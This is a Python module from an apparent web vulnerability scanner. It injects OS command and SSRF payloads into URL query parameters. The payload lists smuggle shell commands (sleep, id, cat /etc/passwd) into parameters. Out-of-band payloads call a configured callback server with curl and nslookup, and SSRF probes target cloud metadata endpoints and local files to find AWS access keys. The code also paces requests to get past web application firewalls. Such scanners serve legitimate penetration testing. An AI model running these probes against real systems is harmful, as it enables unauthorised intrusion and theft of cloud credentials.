import re
from core.ui import vuln, found, CYN, RED, GRY, RESET, info
from core.http import http_probe
from core.config import CONFIG
from core.utils import generate_oob_id
from . import BaseScanner

OSCMD_PAYLOADS = [
    ("; sleep 10", "time"),
    ("| sleep 10", "time"),
    ("`sleep 10`", "time"),
    ("$(sleep 10)", "time"),
    ("; cat /etc/passwd", "blind"),
    ("| id", "blind"),
]

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://127.0.0.1:80",
    "file:///etc/passwd",
]

class SSRFandCmdScanner(BaseScanner):
    async def scan(self, url: str) -> list:
        findings = []
        await self._waf_sleep()
        parsed, params = self._get_params(url)
        if not params: return findings

        # OOB Setup
        oob_id = generate_oob_id() if CONFIG.oob_server else None
        
        # 1. OS Command Injection
        for param in list(params.keys())[:3]:
            cmd_found = False
            curr_payloads = list(OSCMD_PAYLOADS)
            if oob_id:
                curr_payloads.append((f"; curl http://cmd.{oob_id}.{CONFIG.oob_server}", "oob"))
                curr_payloads.append((f"| nslookup cmd.{oob_id}.{CONFIG.oob_server}", "oob"))

            for payload, ptype in curr_payloads:
                test_params = dict(params)
                test_params[param] = [payload]
                test_url = self._build_url(parsed, test_params)
                
                probe_timeout = 15 if ptype == "time" else 8
                code2, body2, _, ms2 = await http_probe(self.session, test_url, timeout=probe_timeout)
                await self._waf_sleep()
                
                if ptype == "time" and ms2 >= 9000:
                    vuln(f"OS CMD INJECTION (Time): {url}")
                    findings.append({"type":"OS-CMD","url":url,"param":param,"payload":payload,"method":"time"})
                    cmd_found = True; break
                elif ptype == "blind" and body2 and re.search(r"(uid=\d+|root:x:0:0|Linux.*GNU)", body2, re.I):
                    vuln(f"OS CMD INJECTION (Output): {url}")
                    findings.append({"type":"OS-CMD","url":url,"param":param,"payload":payload,"method":"output"})
                    cmd_found = True; break
                elif ptype == "oob":
                    findings.append({"type":"OS-CMD-OOB","url":url,"param":param,"payload":payload,"oob_id":oob_id})
            if cmd_found: break

        # 2. SSRF
        ssrf_hit_keywords = re.compile(r"(compute\.internal|ami-id|root:x:0:0|AccessKeyId|metadata\.internal)", re.I)

        for param in list(params.keys())[:3]:
            ssrf_found = False
            curr_ssrf = list(SSRF_PAYLOADS)
            if oob_id:
                curr_ssrf.append(f"http://ssrf.{oob_id}.{CONFIG.oob_server}")

            for payload in curr_ssrf:
                test_params = dict(params)
                test_params[param] = [payload]
                test_url = self._build_url(parsed, test_params)
                
                extra_h = {}
                if "metadata.google" in payload: extra_h["Metadata-Flavor"] = "Google"
                
                code2, body2, _, _ = await http_probe(self.session, test_url, timeout=8, extra_headers=extra_h)
                await self._waf_sleep()
                
                if code2 == 200 and body2 and ssrf_hit_keywords.search(body2):
                    vuln(f"SSRF CONFIRMED: {url}")
                    findings.append({"type":"SSRF","url":url,"param":param,"payload":payload,"evidence": "keyword-match"})
                    ssrf_found = True; break
                elif oob_id and f"{oob_id}.{CONFIG.oob_server}" in payload:
                    findings.append({"type":"SSRF-OOB","url":url,"param":param,"payload":payload,"oob_id":oob_id})
            if ssrf_found: break

        return findings
